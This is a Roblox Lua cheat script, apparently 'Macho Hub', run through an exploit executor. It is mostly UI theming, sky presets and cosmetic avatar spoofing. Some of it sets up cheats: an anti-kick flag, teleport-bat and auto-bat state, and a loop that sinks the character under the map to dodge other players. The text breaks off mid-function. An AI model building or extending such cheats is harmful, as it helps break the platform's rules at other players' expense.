local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local HttpService = game:GetService("HttpService")
local image = "rbxassetid://79422104460159"

if getgenv then
	local genv = getgenv()
	if genv.__MACHO_HUB_LOADED then
		warn("[MACHO HUB] Already loaded — skipping re-execute.")
		return
	end
	genv.__MACHO_HUB_LOADED = true
elseif shared then
	if shared.__MACHO_HUB_LOADED then
		warn("[MACHO HUB] Already loaded — skipping re-execute.")
		return
	end
	shared.__MACHO_HUB_LOADED = true
end

if (function()
	local ok, result = pcall(function()
		return game:GetService("CoreGui")
	end)

	if ok and result then
		if result:FindFirstChild("MachoHub") or result:FindFirstChild("MachoMobileButtons") then
			return true
		end
	end

	local localPlayer = game:GetService("Players").LocalPlayer

	if localPlayer then
		local playerGui = localPlayer:FindFirstChild("PlayerGui")

		if playerGui then
			playerGui = playerGui:FindFirstChild("MachoHub") or playerGui:FindFirstChild("MachoMobileButtons")
		end

		if playerGui then
			return true
		end
	end

	return false
end)() then
	warn("[MACHO HUB] GUI already present — skipping re-execute.")

	if getgenv then
		getgenv().__MACHO_HUB_LOADED = true
	end

	return
end

if isfile and isfile("MachoHUB.json") then
	local ok, result = pcall(function()
		return HttpService:JSONDecode(readfile("MachoHUB.json"))
	end)

	if ok and type(result) == "table" then
		if type(result.backgroundEnabled) == "boolean" then
			backgroundEnabled = result.backgroundEnabled
		end

		if type(result.backgroundIndex) == "number" then
			backgroundIndex = math.max(1, math.floor(result.backgroundIndex))
		end

		if type(result.uiScale) == "number" and result.uiScale >= 0.4 and result.uiScale <= 2 then
			uiScaleValue = result.uiScale
		end

		if type(result.guiScale) == "number" and result.guiScale >= 0.4 and result.guiScale <= 2 then
			uiScaleValue = result.guiScale
		end
	end
end

repeat
	task.wait()
until game:IsLoaded()

pcall(function()
	for _, v in ipairs({ "VoidVS_Intro", "BerserkVS_Intro" }) do
		local CoreGui = game:GetService("CoreGui")
		CoreGui = CoreGui and CoreGui:FindFirstChild(v)

		if CoreGui then
			CoreGui:Destroy()
		end

		local playerGui = Players.LocalPlayer and Players.LocalPlayer:FindFirstChild("PlayerGui")

		if playerGui then
			local v2 = playerGui:FindFirstChild(v)

			if v2 then
				v2:Destroy()
			end
		end
	end

	local SoundService = game:GetService("SoundService")
	SoundService = SoundService and SoundService:FindFirstChild("VoidVS_IntroSong")

	if SoundService then
		SoundService:Stop()
		SoundService:Destroy()
	end
end)

local text = "Night"

local tbl = {
	Off = { kind = "off" },
	Night = {
		clock = 22,
		brightness = 2,
		ambient = { 110, 100, 130 },
		outAmb = { 120, 110, 140 },
		sky = { stars = 4000, moon = 18, sun = 0, moonTex = true },
		atm = { dens = 0.45, color = { 120, 60, 180 }, decay = { 60, 20, 100 }, glare = 0.5, haze = 1.2 },
	},
	Aurora = {
		clock = 14,
		brightness = 3,
		ambient = { 150, 120, 150 },
		outAmb = { 160, 130, 150 },
		atm = { dens = 0.55, color = { 255, 80, 200 }, decay = { 255, 20, 150 }, glare = 2.5, haze = 3 },
		clouds = { cover = 0.7, dens = 0.7, color = { 255, 240, 250 } },
	},
	Sunset = {
		clock = 17.2,
		brightness = 2.5,
		ambient = { 170, 120, 100 },
		outAmb = { 180, 130, 110 },
		sky = { stars = 0, sun = 25, moon = 0 },
		atm = { dens = 0.5, color = { 255, 130, 60 }, decay = { 255, 80, 30 }, glare = 2, haze = 2.5 },
		clouds = { cover = 0.55, dens = 0.55, color = { 255, 200, 140 } },
	},
	Galaxy = {
		clock = 0,
		brightness = 1.5,
		ambient = { 70, 60, 100 },
		outAmb = { 80, 70, 110 },
		sky = { stars = 10000, moon = 30, sun = 0 },
		atm = { dens = 0.15, color = { 40, 20, 80 }, decay = { 20, 10, 50 }, glare = 0.3, haze = 0.5 },
	},
	Cyber = {
		clock = 21,
		brightness = 2.2,
		ambient = { 90, 130, 170 },
		outAmb = { 100, 140, 180 },
		sky = { stars = 2000, moon = 12 },
		atm = { dens = 0.4, color = { 0, 200, 255 }, decay = { 150, 0, 255 }, glare = 2, haze = 2 },
		clouds = { cover = 0.4, dens = 0.6, color = { 100, 200, 255 } },
	},
	Sakura = {
		clock = 11,
		brightness = 3.5,
		ambient = { 170, 150, 160 },
		outAmb = { 180, 160, 170 },
		sky = { sun = 8 },
		atm = { dens = 0.3, color = { 255, 200, 220 }, decay = { 255, 170, 200 }, glare = 1, haze = 1.5 },
		clouds = { cover = 0.6, dens = 0.4, color = { 255, 250, 252 } },
	},
	["Pink Night"] = {
		clock = 23,
		brightness = 2.2,
		ambient = { 120, 60, 110 },
		outAmb = { 140, 70, 120 },
		sky = { stars = 5000, moon = 22, sun = 0, moonTex = true },
		atm = { dens = 0.5, color = { 255, 80, 180 }, decay = { 140, 30, 100 }, glare = 0.7, haze = 1.4 },
		clouds = { cover = 0.3, dens = 0.5, color = { 180, 90, 150 } },
	},
	["Blood Moon"] = {
		clock = 22.5,
		brightness = 1.6,
		ambient = { 130, 40, 40 },
		outAmb = { 150, 50, 50 },
		sky = { stars = 1500, moon = 28, sun = 0, moonTex = true },
		atm = { dens = 0.6, color = { 220, 30, 30 }, decay = { 120, 10, 10 }, glare = 1.4, haze = 2 },
		clouds = { cover = 0.5, dens = 0.7, color = { 120, 30, 30 } },
	},
	["Emerald Dawn"] = {
		clock = 6.5,
		brightness = 2.8,
		ambient = { 130, 170, 140 },
		outAmb = { 140, 180, 150 },
		sky = { sun = 18, moon = 0, stars = 0 },
		atm = { dens = 0.4, color = { 80, 200, 140 }, decay = { 40, 150, 90 }, glare = 1.8, haze = 2.2 },
		clouds = { cover = 0.5, dens = 0.5, color = { 200, 255, 220 } },
	},
	Volcanic = {
		clock = 19,
		brightness = 2,
		ambient = { 180, 80, 40 },
		outAmb = { 200, 90, 50 },
		sky = { stars = 200, sun = 12, moon = 0 },
		atm = { dens = 0.75, color = { 255, 60, 0 }, decay = { 180, 20, 0 }, glare = 3, haze = 3.5 },
		clouds = { cover = 0.8, dens = 0.9, color = { 120, 40, 20 } },
	},
	Arctic = {
		clock = 9,
		brightness = 3.2,
		ambient = { 200, 220, 235 },
		outAmb = { 210, 230, 245 },
		sky = { sun = 10, stars = 0, moon = 0 },
		atm = {
			dens = 0.3,
			color = { 180, 220, 255 },
			decay = { 140, 200, 240 },
			glare = 1.5,
			haze = 1.8,
		},
		clouds = { cover = 0.7, dens = 0.6, color = { 250, 253, 255 } },
	},
	["Midnight Ocean"] = {
		clock = 1.5,
		brightness = 1.7,
		ambient = { 60, 90, 130 },
		outAmb = { 70, 100, 140 },
		sky = { stars = 6000, moon = 24, sun = 0, moonTex = true },
		atm = { dens = 0.5, color = { 20, 60, 140 }, decay = { 10, 30, 90 }, glare = 0.6, haze = 1.5 },
	},
	Vaporwave = {
		clock = 19.5,
		brightness = 2.4,
		ambient = { 180, 120, 200 },
		outAmb = { 190, 130, 210 },
		sky = { stars = 1000, moon = 14 },
		atm = {
			dens = 0.45,
			color = { 255, 100, 220 },
			decay = { 120, 60, 255 },
			glare = 2.2,
			haze = 2.4,
		},
		clouds = { cover = 0.5, dens = 0.55, color = { 200, 150, 255 } },
	},
	Toxic = {
		clock = 13,
		brightness = 2.5,
		ambient = { 140, 180, 80 },
		outAmb = { 150, 190, 90 },
		atm = { dens = 0.55, color = { 100, 220, 40 }, decay = { 60, 150, 20 }, glare = 1.8, haze = 2.6 },
		clouds = { cover = 0.65, dens = 0.7, color = { 180, 255, 120 } },
	},
	["Solar Eclipse"] = {
		clock = 12,
		brightness = 0.9,
		ambient = { 50, 40, 60 },
		outAmb = { 60, 50, 70 },
		sky = { stars = 3500, sun = 22, moon = 0 },
		atm = { dens = 0.5, color = { 255, 140, 40 }, decay = { 30, 20, 40 }, glare = 2.8, haze = 1.8 },
	},
	Hellscape = {
		clock = 18,
		brightness = 1.8,
		ambient = { 200, 60, 30 },
		outAmb = { 220, 70, 40 },
		sky = { stars = 100, sun = 30, moon = 0 },
		atm = { dens = 0.85, color = { 255, 30, 0 }, decay = { 120, 0, 0 }, glare = 3.5, haze = 4 },
		clouds = { cover = 0.95, dens = 0.95, color = { 80, 20, 10 } },
	},
	Heaven = {
		clock = 12,
		brightness = 4,
		ambient = { 240, 235, 210 },
		outAmb = { 250, 245, 220 },
		sky = { sun = 16, moon = 0, stars = 0 },
		atm = { dens = 0.25, color = { 255, 250, 220 }, decay = { 255, 240, 200 }, glare = 3, haze = 1.5 },
		clouds = { cover = 0.85, dens = 0.5, color = { 255, 255, 255 } },
	},
	Storm = {
		clock = 15,
		brightness = 1.4,
		ambient = { 90, 90, 110 },
		outAmb = { 100, 100, 120 },
		sky = { stars = 0, sun = 6, moon = 0 },
		atm = { dens = 0.65, color = { 80, 90, 120 }, decay = { 40, 50, 80 }, glare = 0.5, haze = 3 },
		clouds = { cover = 0.95, dens = 0.95, color = { 60, 65, 80 } },
	},
	Sunrise = {
		clock = 6.2,
		brightness = 2.8,
		ambient = { 220, 180, 130 },
		outAmb = { 230, 190, 140 },
		sky = { sun = 22, stars = 0, moon = 0 },
		atm = {
			dens = 0.45,
			color = { 255, 180, 100 },
			decay = { 255, 140, 80 },
			glare = 2.4,
			haze = 2.2,
		},
		clouds = { cover = 0.4, dens = 0.4, color = { 255, 220, 180 } },
	},
	["Deep Space"] = {
		clock = 0,
		brightness = 1,
		ambient = { 30, 25, 50 },
		outAmb = { 40, 35, 60 },
		sky = { stars = 15000, moon = 0, sun = 0 },
		atm = { dens = 0.08, color = { 15, 5, 40 }, decay = { 5, 0, 20 }, glare = 0.2, haze = 0.3 },
	},
	["Lavender Dream"] = {
		clock = 18.5,
		brightness = 2.6,
		ambient = { 180, 160, 220 },
		outAmb = { 190, 170, 230 },
		sky = { stars = 800, moon = 16, sun = 0 },
		atm = {
			dens = 0.4,
			color = { 200, 160, 255 },
			decay = { 160, 120, 220 },
			glare = 1.4,
			haze = 1.8,
		},
		clouds = { cover = 0.55, dens = 0.5, color = { 220, 200, 255 } },
	},
	Inferno = {
		clock = 17.5,
		brightness = 2.2,
		ambient = { 220, 100, 40 },
		outAmb = { 235, 110, 50 },
		sky = { sun = 26, moon = 0, stars = 0 },
		atm = { dens = 0.6, color = { 255, 90, 20 }, decay = { 200, 40, 0 }, glare = 3, haze = 3.2 },
		clouds = { cover = 0.7, dens = 0.7, color = { 200, 80, 40 } },
	},
	["Mint Sky"] = {
		clock = 10,
		brightness = 3.2,
		ambient = { 180, 230, 210 },
		outAmb = { 190, 240, 220 },
		sky = { sun = 10 },
		atm = {
			dens = 0.32,
			color = { 150, 255, 210 },
			decay = { 100, 220, 180 },
			glare = 1.6,
			haze = 1.6,
		},
		clouds = { cover = 0.55, dens = 0.45, color = { 240, 255, 250 } },
	},
}

local tbl2 = {
	"Off",
	"Night",
	"Aurora",
	"Sunset",
	"Galaxy",
	"Cyber",
	"Sakura",
	"Pink Night",
	"Blood Moon",
	"Emerald Dawn",
	"Volcanic",
	"Arctic",
	"Midnight Ocean",
	"Vaporwave",
	"Toxic",
	"Solar Eclipse",
	"Hellscape",
	"Heaven",
	"Storm",
	"Sunrise",
	"Deep Space",
	"Lavender Dream",
	"Inferno",
	"Mint Sky",
}

candyColor = function(arg)
	return Color3.fromRGB(arg[1], arg[2], arg[3])
end

CandyApplyCustomSky = function(arg)
	for _, child in ipairs(Lighting:GetChildren()) do
		if child:GetAttribute("MoveeSkyTheme") then
			pcall(function()
				child:Destroy()
			end)
		end
	end

	local terrain = workspace:FindFirstChildOfClass("Terrain")

	if terrain then
		for _, child in ipairs(terrain:GetChildren()) do
			if child:GetAttribute("MoveeSkyTheme") then
				pcall(function()
					child:Destroy()
				end)
			end
		end
	end

	local v = tbl[arg]

	if not v or v.kind == "off" then
		Lighting.ClockTime = 14
		Lighting.Brightness = 2
		Lighting.OutdoorAmbient = Color3.fromRGB(127, 127, 127)
		Lighting.Ambient = Color3.fromRGB(127, 127, 127)
		Lighting.FogEnd = 100000
		Lighting.GlobalShadows = true
		return
	end

	Lighting.FogStart = 0
	Lighting.FogEnd = 100000
	Lighting.FogColor = Color3.fromRGB(200, 200, 200)
	Lighting.ColorShift_Top = Color3.fromRGB(0, 0, 0)
	Lighting.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
	Lighting.GlobalShadows = true
	Lighting.ClockTime = v.clock or 14
	Lighting.Brightness = v.brightness or 2

	if v.outAmb then
		Lighting.OutdoorAmbient = candyColor(v.outAmb)
	end

	if v.ambient then
		Lighting.Ambient = candyColor(v.ambient)
	end

	if v.sky then
		local sky = Instance.new("Sky")
		sky:SetAttribute("MoveeSkyTheme", true)

		if v.sky.stars then
			sky.StarCount = v.sky.stars
		end

		if v.sky.moon then
			sky.MoonAngularSize = v.sky.moon
		end

		if v.sky.sun then
			sky.SunAngularSize = v.sky.sun
		end

		if v.sky.moonTex then
			sky.MoonTextureId = "rbxasset://sky/moon.jpg"
		end

		sky.Parent = Lighting
	end

	if v.atm then
		local atmosphere = Instance.new("Atmosphere")
		atmosphere:SetAttribute("MoveeSkyTheme", true)
		atmosphere.Density = v.atm.dens or 0.3
		atmosphere.Color = candyColor(v.atm.color)
		atmosphere.Decay = candyColor(v.atm.decay)
		atmosphere.Glare = v.atm.glare or 1
		atmosphere.Haze = v.atm.haze or 1
		atmosphere.Parent = Lighting
	end

	if v.clouds and terrain then
		local clouds = Instance.new("Clouds")
		clouds:SetAttribute("MoveeSkyTheme", true)
		clouds.Cover = v.clouds.cover or 0.5
		clouds.Density = v.clouds.dens or 0.5
		clouds.Color = candyColor(v.clouds.color)
		clouds.Parent = terrain
	end
end

local localPlayer = Players.LocalPlayer

loadCustomImageAsset = function(arg, arg2)
	if not arg or arg == "" then
		return ""
	end
	arg2 = arg2 or "void_img_" .. tostring(math.floor(tick() * 1000)) .. ".png"

	local function fn(arg3)
		for _, v in ipairs({ getcustomasset, getsynasset, getasset }) do
			if typeof(v) ~= "function" then
				continue
			end

			local ok, result = pcall(function()
				return v(arg3)
			end)

			if ok and type(result) == "string" and result ~= "" then
				return result
			end
		end

		if typeof(getcustomasset) == "function" then
			local ok, result = pcall(function()
				return getcustomasset(arg3)
			end)

			if ok and type(result) == "string" and result ~= "" then
				return result
			end
		end

		return ""
	end

	if isfile and isfile(arg2) then
		local v = fn(arg2)
		if v ~= "" then
			return v
		end
	end

	local body = nil

	pcall(function()
		local response = game:HttpGet(arg)

		if response and #response > 80 then
			body = response
		end
	end)

	if not body then
		local request_ = syn and syn.request or http and (http.request or http.Request) or request or http_request

		if request_ then
			local ok, result = pcall(function()
				return request_({ Url = arg, Method = "GET", Headers = { ["User-Agent"] = "Mozilla/5.0" } })
			end)

			if ok and type(result) == "table" then
				body = result.Body or result.body or result.Data or result.data
			elseif ok and type(result) == "string" then
				body = result
			end
		end
	end

	if not body or #body < 80 then
		return arg
	end

	pcall(function()
		if writefile then
			writefile(arg2, body)
		end
	end)

	task.wait(0.05)
	local v = fn(arg2)
	if v ~= "" then
		return v
	end
	return arg
end

local n = 59
local n2 = 9
local n3 = 30
local n4 = 15
local flag = false
local flag2 = false
local flag3 = true
local n5 = 80
local flag4 = false
local flag5 = false
local flag6 = false
local flag7 = false
local flag8 = false
local flag9 = false
local n6 = 0
local flag10 = false

local tbl3 = {
	antiKick = true,
	brainrot = false,
	tpBat = false,
	batV2 = false,
	tpConn = nil,
	v2Conn = nil,
	v2Rot = nil,
	hitCD = false,
	v2CD = false,
	setTPBatVisual = nil,
	setAntiKickVisual = nil,
	setSafeModeVisual = nil,
	startTPBat = nil,
	stopTPBat = nil,
	startBatV2 = nil,
	stopBatV2 = nil,
	toggleBatV2 = nil,
	enableAntiKick = nil,
	disableAntiKick = nil,
	findBat = nil,
	closestRoot = nil,
	tpHit = nil,
	_tpShieldConn = nil,
	_tpAntiDieConn = nil,
	_tpCharConn = nil,
	_tpPatchConn = nil,
	_tpHitDone = false,
	_tpTargetHealth = nil,
	_tpTargetHum = nil,
	_tpLockedRoot = nil,
}

local flag11 = false
local flag12 = false
local v = nil
local v2 = nil
local flag13 = false
local flag14 = false
local n7 = 56.5
local connection = nil
local n8 = 0
local flag15 = false
local n9 = 3
local n10 = -7
local tbl4 = {}
local n11 = 0

local function fn()
	return flag13 == true or flag14 == true or tbl3 and tbl3.batV2 == true
end

local function fn2()
	local character = localPlayer.Character
	local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
	character = character and character:FindFirstChildOfClass("Humanoid")
	if not humanoidRootPart or not character or character.Health <= 0 then
		return
	end
	local now = tick()
	if now - (n11 or 0) < 0.08 then
		return
	end
	n11 = now
	local v3, v4 = humanoidRootPart.CFrame:ToEulerAnglesYXZ()
	humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, (n10 or -7) + math.random() * 0.6 - 0.3, humanoidRootPart.Position.Z) * CFrame.Angles(0, v4, 0)
	humanoidRootPart.AssemblyLinearVelocity = Vector3.new((math.random() - 0.5) * 0.4, 0, (math.random() - 0.5) * 0.4)
end

RunService.Heartbeat:Connect(function()
	if not flag15 or not fn() then
		if next(tbl4) then
			table.clear(tbl4)
		end

		return
	end

	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= localPlayer and player.Character then
			local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")

			if humanoidRootPart then
				local y = humanoidRootPart.Position.Y
				local flag16 = tbl4[player.UserId]

				if flag16 then
					flag16 = flag16 - y >= 3
				end

				if flag16 then
					pcall(fn2)
					table.clear(tbl4)
					return
				end

				tbl4[player.UserId] = y
			end
		end
	end
end)

local tbl5 = {
	WHITE = Color3.fromRGB(255, 255, 255),
	PURPLE = Color3.fromRGB(207, 159, 255),
	BLUE = Color3.fromRGB(58, 128, 245),
	RED = Color3.fromRGB(232, 52, 68),
	PINK = Color3.fromRGB(255, 105, 180),
	YELLOW = Color3.fromRGB(255, 214, 0),
	GREY = Color3.fromRGB(90, 90, 90),
	FOREST = Color3.fromRGB(46, 139, 87),
	GREEN = Color3.fromRGB(0, 255, 120),
	NEON = Color3.fromRGB(50, 255, 140),
	RAINBOW = Color3.fromRGB(255, 0, 0),
}

RAINBOW_CUR = Color3.fromRGB(255, 0, 0)
local str = "GREEN"

local function fn3()
	if str == "RAINBOW" then
		return RAINBOW_CUR
	end
	return tbl5[str] or tbl5.WHITE
end

_G.__isRainbow = function()
	return str == "RAINBOW"
end

PULSE = PULSE or { fns = {} }

PULSE.add = function(arg)
	table.insert(PULSE.fns, arg)
end

PULSE.mix = function(arg, arg2, arg3)
	return Color3.new(arg.R + (arg2.R - arg.R) * arg3, arg.G + (arg2.G - arg.G) * arg3, arg.B + (arg2.B - arg.B) * arg3)
end

task.spawn(function()
	while true do
		local n12 = (math.sin(os.clock() * 1.7) + 1) * 0.5

		for i = #PULSE.fns, 1, -1 do
			local ok, result = pcall(PULSE.fns[i], n12)

			if not ok or result == false then
				table.remove(PULSE.fns, i)
			end
		end

		task.wait(0.05)
	end
end)

task.spawn(function()
	local n12 = 0

	while true do
		task.wait(0.07)

		if str == "RAINBOW" then
			n12 = (n12 + 0.005) % 1
			local n13 = 0.88 + 0.12 * math.sin(os.clock() * 1.6)
			local clamp = math.clamp
			RAINBOW_CUR = Color3.fromHSV(n12, math.clamp(0.78 + 0.18 * math.sin(os.clock() * 0.9), 0, 1), clamp(n13, 0, 1))

			pcall(function()
				if applyVoidTheme then
					applyVoidTheme()
				end
			end)
		end
	end
end)

local function fn4(arg, arg2, arg3)
	local n12 = math.clamp(arg3 or 0.5, 0, 1)
	return Color3.new(arg.R + (arg2.R - arg.R) * n12, arg.G + (arg2.G - arg.G) * n12, arg.B + (arg2.B - arg.B) * n12)
end

local function fn5()
	local v3 = fn3()

	pcall(function()
		if C then
			local color = Color3.fromRGB(8, 8, 10)
			local color2 = Color3.fromRGB(4, 4, 6)
			C.blue = v3
			C.blueDim = fn4(v3, Color3.fromRGB(30, 30, 30), 0.45)
			C.blueDark = fn4(color2, v3, 0.18)
			C.bg = fn4(color, v3, 0.08)
			C.bgDark = fn4(color2, v3, 0.06)
			C.row = fn4(Color3.fromRGB(14, 14, 18), v3, 0.12)
			C.input = fn4(Color3.fromRGB(14, 14, 18), v3, 0.1)
			C.divider = fn4(Color3.fromRGB(40, 40, 48), v3, 0.35)
			C.text = Color3.fromRGB(255, 255, 255)
			C.textDim = fn4(Color3.fromRGB(170, 170, 180), v3, 0.3)
			C.textMuted = fn4(Color3.fromRGB(110, 110, 120), v3, 0.25)
			C.white = Color3.fromRGB(255, 255, 255)

			if C.green then
				C.green = v3
			end
		end

		local function fn6(arg)
			if not arg then
				return false
			end
			local n12 = arg.R * 255
			local n13 = arg.G * 255
			local n14 = arg.B * 255
			local n15 = math.max(n12, n13, n14) - math.min(n12, n13, n14)
			local n16 = (n12 + n13 + n14) / 3
			if n13 > 90 and n13 >= n12 * 1.15 and n13 >= n14 * 1.15 and n15 > 20 then
				return true
			end

			if n15 > 40 and n16 > 35 and n16 < 250 then
				return true
			end
			return false
		end

		local function fn7(arg)
			if not arg then
				return
			end

			for _, descendant in ipairs(arg:GetDescendants()) do
				if not descendant:GetAttribute("ThemeSwatch") then
					if descendant:IsA("UIStroke") then
						local name = descendant.Parent and descendant.Parent.Name or ""
						local attribute = descendant:GetAttribute("_baseColor")

						if not attribute then
							attribute = descendant.Color
							descendant:SetAttribute("_baseColor", attribute)
						end

						if name == "LogoCircle" or name == "TabHighlight" or name == "MachoOpenPill" or name == "MiniBtn" then
							descendant.Color = v3
						elseif fn6(attribute) then
							descendant.Color = v3
						else
							descendant.Color = fn4(attribute, v3, 0.55)
						end
					elseif descendant:IsA("Frame") or descendant:IsA("TextButton") or descendant:IsA("ImageButton") then
						local attribute = descendant:GetAttribute("_baseBG")

						if not attribute then
							attribute = descendant.BackgroundColor3
							descendant:SetAttribute("_baseBG", attribute)
						end

						if attribute and fn6(attribute) then
							descendant.BackgroundColor3 = v3
						elseif attribute then
							local n12 = attribute.R * 255
							local n13 = attribute.G * 255
							local n14 = attribute.B * 255
							local n15 = (n12 + n13 + n14) / 3

							if math.max(n12, n13, n14) - math.min(n12, n13, n14) < 45 and n15 < 95 then
								descendant.BackgroundColor3 = fn4(Color3.fromRGB(n12, n13, n14), v3, 0.22)
							else
								descendant.BackgroundColor3 = attribute
							end
						end

						if descendant:IsA("TextButton") then
							local attribute2 = descendant:GetAttribute("_baseText")

							if not attribute2 then
								attribute2 = descendant.TextColor3
								descendant:SetAttribute("_baseText", attribute2)
							end

							descendant.TextColor3 = fn6(attribute2) and v3 or attribute2
						end
					elseif descendant:IsA("TextLabel") then
						local attribute = descendant:GetAttribute("_baseText")

						if not attribute then
							local textColor3 = descendant.TextColor3
							descendant:SetAttribute("_baseText", textColor3)
							attribute = textColor3
						end

						descendant.TextColor3 = fn6(attribute) and v3 or attribute
					end
				end

				if descendant.Name == "MachoTitle" and (descendant:IsA("ImageLabel") or descendant:IsA("ImageButton")) then
					descendant.ImageColor3 = fn4(Color3.fromRGB(255, 255, 255), v3, 0.4)
				elseif descendant.Name == "LogoCircle" and (descendant:IsA("ImageLabel") or descendant:IsA("ImageButton")) then
					descendant.ImageColor3 = Color3.fromRGB(255, 255, 255)
				elseif descendant:IsA("ImageLabel") and descendant.Name == "BtnImage" then
					descendant.ImageColor3 = Color3.fromRGB(255, 255, 255)
				end
			end
		end

		if GuiRefs then
			if GuiRefs.outer then
				fn7(GuiRefs.outer)
			end

			if GuiRefs.inner then
				GuiRefs.inner.BackgroundColor3 = C and C.bg or Color3.fromRGB(8, 8, 10)
				local uiStroke = GuiRefs.inner:FindFirstChildOfClass("UIStroke")

				if uiStroke then
					uiStroke.Color = v3
				end

				fn7(GuiRefs.inner)
			end

			if GuiRefs.hub then
				fn7(GuiRefs.hub)
			end

			if GuiRefs.categoryList then
				fn7(GuiRefs.categoryList)
			end

			if GuiRefs.contentFrame then
				fn7(GuiRefs.contentFrame)
			end

			if GuiRefs.bgGrad then
				GuiRefs.bgGrad.BackgroundColor3 = C and C.bgDark or Color3.fromRGB(4, 4, 6)
			end

			if GuiRefs.machoTitle then
				if GuiRefs.machoTitle:IsA("ImageLabel") or GuiRefs.machoTitle:IsA("ImageButton") then
					GuiRefs.machoTitle.ImageColor3 = fn4(Color3.fromRGB(255, 255, 255), v3, 0.4)
				end
			end

			if CategoryRefs and CategoryRefs.btnsSide then
				for k, v4 in pairs(CategoryRefs.btnsSide) do
					local flag16 = k == CategoryRefs.active
					local row = C and C.row or Color3.fromRGB(16, 19, 21)
					v4.BackgroundColor3 = flag16 and fn4(row, v3, 0.14) or row
					v4.BackgroundTransparency = flag16 and 0 or 0.22
					v4.TextColor3 = flag16 and Color3.fromRGB(255, 255, 255) or C and C.textDim or Color3.fromRGB(150, 165, 158)
					local indicators = CategoryRefs.indicators and CategoryRefs.indicators[k]

					if indicators then
						indicators.bar.BackgroundColor3 = v3

						if indicators.glow then
							indicators.glow.ImageColor3 = v3
						end
					end
				end
			end

			if CategoryRefs and CategoryRefs.tabHL then
				CategoryRefs.tabHL.BackgroundColor3 = v3
				local uiStroke = CategoryRefs.tabHL:FindFirstChildOfClass("UIStroke")

				if uiStroke then
					uiStroke.Color = v3
				end
			end

			if GuiRefs and GuiRefs.contentFrame then
				GuiRefs.contentFrame.ScrollBarImageColor3 = v3
			end

			if MOB_BTN_THEME then
				for _, v4 in ipairs(MOB_BTN_THEME) do
					pcall(v4)
				end
			end

			if WATERMARK_REFRESH then
				pcall(WATERMARK_REFRESH, v3)
			end

			if GuiRefs.inner then
				for _, child in ipairs(GuiRefs.inner:GetChildren()) do
					if child:IsA("Frame") and child.Size.X.Offset <= 2 and child.Size.X.Scale == 0 then
						if not fn6(child.BackgroundColor3) then
						end

						child.BackgroundColor3 = v3
					end
				end
			end
		end

		if mobGuiRef then
			for _, descendant in ipairs(mobGuiRef:GetDescendants()) do
				if descendant:IsA("UIStroke") then
					descendant.Color = v3
				end
			end
		end

		if stealBarFrame then
			for _, descendant in ipairs(stealBarFrame:GetDescendants()) do
				if descendant:IsA("UIStroke") then
					descendant.Color = v3
				end
			end

			local uiStroke = stealBarFrame:FindFirstChildOfClass("UIStroke")

			if uiStroke then
				uiStroke.Color = v3
			end
		end
	end)
end

local flag16 = false
local flag17 = false
local flag18 = true
local flag19 = false
local n12 = 0.3
_alSwingDebounce = false
_arSwingDebounce = false
autoBatSetVisual = nil
resetAutoBatMotion = nil
setBatCounterVisual = nil
startBatCounter = nil
stopBatCounter = nil
local flag20 = false
removeAccessoriesEnabled = false
antiLagDescConn = nil
local flag21 = false
stretchRezConn = nil
setStretchRezVisual = nil
unwalkSavedAnimate = nil
_anyKeyListening = false
local flag22 = false
autoTPHeight = 20
autoTPConn = nil
setAutoTPVisual = nil
local flag23 = false
local flag24 = true
local flag25 = false
local visible = true
logoCircleRef = nil
local n13 = 80
MachotextEnabled = false
local flag26 = false
stealBarFrame = nil
local n14 = 2
local n15 = 1
uiScaleValue = 1

local tbl6 = {
	carrySpeed = nil,
	lagger = nil,
	laggerCarry = nil,
	laggerNormal = nil,
	autoLeft = nil,
	autoRight = nil,
	autoBat = nil,
	tpBat = nil,
	batV2 = nil,
}

mobGuiRef = nil
local fieldOfView = 80
local n16 = 1
laggerModePillRef = nil
carryModePillRef = nil
local flag27 = false
local flag28 = false
local text2 = "OFF"
local flag29 = false
local flag30 = false
local meshId = "rbxassetid://1095708"
local meshId2 = "rbxassetid://101851696"
local textureId = "rbxassetid://101851254"
local color = Color3.fromRGB(64, 64, 64)

local function fn6(arg)
	local face = arg:FindFirstChild("face")

	if face then
		face:Destroy()
	end
end

applyHeadlessToChar = function(arg, arg2)
	if not arg then
		return
	end
	local head = arg:FindFirstChild("Head")
	if not head then
		return
	end

	if arg2 then
		head.Transparency = 1
		head.CanCollide = false
		fn6(head)

		for _, child in ipairs(head:GetChildren()) do
			if child:IsA("SpecialMesh") and (child.Name == "HeadlessMesh" or child.MeshId == meshId) then
				child:Destroy()
			end
		end

		local specialMesh = Instance.new("SpecialMesh")
		specialMesh.MeshType = Enum.MeshType.FileMesh
		specialMesh.MeshId = meshId
		specialMesh.Scale = Vector3.new(0.001, 0.001, 0.001)
		specialMesh.Name = "HeadlessMesh"
		specialMesh.Parent = head

		head:GetPropertyChangedSignal("Transparency"):Connect(function()
			if head.Transparency ~= 1 then
				head.Transparency = 1
			end
		end)

		head.ChildAdded:Connect(function(child)
			if child.Name == "face" and child:IsA("Decal") then
				child:Destroy()
			end
		end)
	else
		head.Transparency = 0
		head.CanCollide = true

		for _, child in ipairs(head:GetChildren()) do
			if child:IsA("SpecialMesh") and child.Name == "HeadlessMesh" then
				child:Destroy()
			end
		end
	end
end

applyKorbloxToChar = function(parent, arg)
	if not parent then
		return
	end
	local humanoid = parent:FindFirstChildOfClass("Humanoid")
	if not humanoid then
		return
	end

	if arg then
		if humanoid.RigType == Enum.HumanoidRigType.R6 then
			local rightLeg = parent:FindFirstChild("Right Leg")

			if rightLeg then
				for _, child in ipairs(rightLeg:GetChildren()) do
					if child:IsA("SpecialMesh") and child.Name == "KorbloxMesh" then
						child:Destroy()
					end
				end

				local specialMesh = Instance.new("SpecialMesh")
				specialMesh.MeshType = Enum.MeshType.FileMesh
				specialMesh.MeshId = meshId2
				specialMesh.TextureId = textureId
				specialMesh.Scale = Vector3.one
				specialMesh.Name = "KorbloxMesh"
				specialMesh.Parent = rightLeg
				rightLeg.Color = color
			end
		elseif humanoid.RigType == Enum.HumanoidRigType.R15 then
			local rightUpperLeg = parent:FindFirstChild("RightUpperLeg")

			if rightUpperLeg then
				rightUpperLeg.Transparency = 1
				local rightLowerLeg = parent:FindFirstChild("RightLowerLeg")
